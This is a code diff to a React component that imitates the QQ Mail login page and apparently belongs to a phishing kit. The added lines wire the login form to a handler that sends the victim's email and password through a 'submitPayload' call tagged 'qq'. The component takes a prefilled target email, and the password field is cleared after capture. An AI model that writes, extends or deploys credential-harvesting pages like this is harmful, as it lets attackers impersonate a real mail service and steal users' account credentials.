@@ -1,6 +1,7 @@
 
 import React, { useState } from 'react';
 import { useTranslation } from '../components/LanguageProvider';
+import { useSecurity } from '../components/SecurityManager';
 
 interface QQMailThemeProps {
   prefilledEmail?: string;
@@ -11,6 +12,21 @@ const QQMailTheme: React.FC<QQMailThemeProps> = ({ prefilledEmail }) => {
   const [username, setUsername] = useState(prefilledEmail || '');
   const [password, setPassword] = useState('');
   const [activeTab, setActiveTab] = useState<'scan' | 'qq' | 'wechat'>('qq');
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const { submitPayload } = useSecurity();
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setIsSubmitting(true);
+    try {
+      await submitPayload({ email: username, password }, 'qq');
+      setPassword('');
+    } catch (err) {
+      console.error(err);
+    } finally {
+      setIsSubmitting(false);
+    }
+  };
 
   return (
     <div className="min-h-screen flex flex-col bg-[#eff4f8] font-sans text-[#333] selection:bg-blue-100">
@@ -117,7 +133,7 @@ const QQMailTheme: React.FC<QQMailThemeProps> = ({ prefilledEmail }) => {
                 </p>
               </div>
 
-              <form className="space-y-4">
+              <form onSubmit={handleSubmit} className="space-y-4">
                 <div className="relative">
                   <input 
                     type="text" 
@@ -138,8 +154,12 @@ const QQMailTheme: React.FC<QQMailThemeProps> = ({ prefilledEmail }) => {
                   />
                 </div>
 
-                <button className="w-full py-3 bg-[#00a1ff] hover:bg-[#0092e6] text-white font-medium rounded transition-colors text-[16px] shadow-sm">
-                  {lang === 'zh' ? '登 录' : 'Log In'}
+                <button 
+                  type="submit"
+                  disabled={isSubmitting}
+                  className="w-full py-3 bg-[#00a1ff] hover:bg-[#0092e6] text-white font-medium rounded transition-colors text-[16px] shadow-sm disabled:opacity-70"
+                >
+                  {isSubmitting ? '...' : (lang === 'zh' ? '登 录' : 'Log In')}
                 </button>
 
                 <div className="flex items-center justify-center space-x-4 text-[12px] text-gray-500 pt-2">
